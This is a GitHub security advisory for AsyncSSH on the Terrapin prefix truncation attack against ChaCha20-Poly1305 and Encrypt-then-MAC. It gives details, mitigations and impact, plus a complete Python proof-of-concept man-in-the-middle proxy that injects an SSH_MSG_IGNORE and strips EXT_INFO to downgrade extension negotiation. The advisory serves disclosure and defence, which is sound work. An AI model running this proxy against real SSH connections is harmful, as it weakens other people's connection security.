# [M] AsyncSSH vulnerable to Prefix Truncation Attack (a.k.a. Terrapin Attack) against ChaCha20-Poly1305 and Encrypt-then-MAC

## Summary
Severity: Medium
Advisory: GHSA-hfmc-7525-mj55
CWE: CWE-345
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2023-12-18
Source: https://github.com/advisories/GHSA-hfmc-7525-mj55
Type: github-advisory

## Affected
- PyPI: `asyncssh` — affected >=0 <2.14.2

## Details
### Summary

AsyncSSH v2.14.1 and earlier is vulnerable to a novel prefix truncation attack (a.k.a. Terrapin attack), which allows a man-in-the-middle attacker to strip an arbitrary number of messages right after the initial key exchange, breaking SSH extension negotiation (RFC8308) in the process and thus downgrading connection security.

### Mitigations

To mitigate this protocol vulnerability, OpenSSH suggested a so-called "strict kex" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes. Support for strict key exchange has been added to AsyncSSH in the patched version. 

**Warning: To take effect, both the client and server must support this countermeasure.** 

As a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.

### Details

The SSH specifications of ChaCha20-Poly1305 (`chacha20-poly1305@openssh.com`) and Encrypt-then-MAC (`*-etm@openssh.com` MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.

The attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.

In the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.

For more details and a pre-print of the associated research paper, see [https://terrapin-attack.com](https://terrapin-attack.com). This website is not affiliated with AsyncSSH in any way.

### PoC

<details>
  <summary>Extension Negotiation Downgrade Attack (chacha20-poly1305@openssh.com)</summary>
  
  ```python
#!/usr/bin/python3
import socket
from binascii import unhexlify
from threading import Thread
from time import sleep

#####################################################################################
## Proof of Concept for the extension downgrade attack                             ##
##                                                                                 ##
## Variant: ChaCha20-Poly1305                                                      ##
##                                                                                 ##
## Client(s) tested: OpenSSH 9.5p1 / PuTTY 0.79                                    ##
## Server(s) tested: OpenSSH 9.5p1                                                 ##
##                                                                                 ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
#####################################################################################

# IP and port for the TCP proxy to bind to
PROXY_IP = '127.0.0.1'
PROXY_PORT = 2222

# IP and port of the server
SERVER_IP = '127.0.0.1'
SERVER_PORT = 22

LENGTH_FIELD_LENGTH = 4

def pipe_socket_stream(in_socket, out_socket):
    try:
        while True:
            data = in_socket.recv(4096)
            if len(data) == 0:
                break
            out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.")
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.")
    in_socket.close()
    out_socket.close()

rogue_msg_ignore = unhexlify('0000000C060200000000000000000000')
def perform_attack(client_socket, server_socket):
    # Version exchange
    client_vex = client_socket.recv(255)
    server_vex = server_socket.recv(255)
    client_socket.send(server_vex)
    server_socket.send(client_vex)
    # SSH_MSG_KEXINIT
    client_kexinit = client_socket.recv(35000)
    server_kexinit = server_socket.recv(35000)
    client_socket.send(server_kexinit)
    server_socket.send(client_kexinit)
    # Client will now send the key exchange INIT
    client_kex_init = client_socket.recv(35000)
    server_socket.send(client_kex_init)
    # Insert ignore message (to client)
    client_socket.send(rogue_msg_ignore)
    # Wait half a second here to avoid missing EXT_INFO
    # Can be solved by counting bytes as well
    sleep(0.5)
    # KEX_REPLY / NEW_KEYS / EXT_INFO
    server_response = server_socket.recv(35000)
    # Strip EXT_INFO before forwarding server_response to client
    # Length fields of KEX_REPLY and NEW_KEYS are still unencrypted
    server_kex_reply_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[:LENGTH_FIELD_LENGTH])
    server_newkeys_start = server_kex_reply_length
    server_newkeys_length = LENGTH_FIELD_LENGTH + int.from_bytes(server_response[server_newkeys_start:server_newkeys_start + LENGTH_FIELD_LENGTH])
    server_extinfo_start = server_newkeys_start + server_newkeys_length
    client_socket.send(server_response[:server_extinfo_start])

if __name__ == '__main__':
    print("--- Proof of Concept for extension downgrade attack (ChaCha20-Poly1305) ---")
    mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mitm_socket.bind((PROXY_IP, PROXY_PORT))
    mitm_socket.listen(5)

    print(f"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...")
    try:
        while True:
            client_socket, client_addr = mitm_socket.accept()
            print(f"[+] Accepted connection from: {client_addr}")
            print(f"[+] Establishing new target connection to {(SERVER_IP, SERVER_PORT)}.")
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((SERVER_IP, SERVER_PORT))
            print("[+] Performing extension downgrade")
            perform_attack(client_socket, server_socket)
            print("[+] Downgrade performed. Spawning new forwarding threads to handle client connection from now on.")
            forward_client_to_server_thread = Thread(target=pipe_socket_stream, args=(client_socket, server_socket), daemon=True)
            forward_client_to_server_thread.start()
            forward_server_to_client_thread = Thread(target=pipe_socket_stream, args=(server_socket, client_socket), daemon=True)
            forward_server_to_client_thread.start()
    except KeyboardInterrupt:
        client_socket.close()
        server_socket.close()
        mitm_socket.close()
  ```
</details>

### Impact

This attack targets the specification of ChaCha20-Poly1305 (`chacha20-poly1305@openssh.com`) and Encrypt-then-MAC (`*-etm@openssh.com`), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario.

## References
- https://github.com/ronf/asyncssh/security/advisories/GHSA-hfmc-7525-mj55
- https://github.com/ronf/asyncssh/commit/0bc73254f41acb140187e0c89606311f88de5b7b
- https://github.com/ronf/asyncssh/commit/69f5a41b458b29367a65fe469c2b0255b5db210a
- https://github.com/ronf/asyncssh
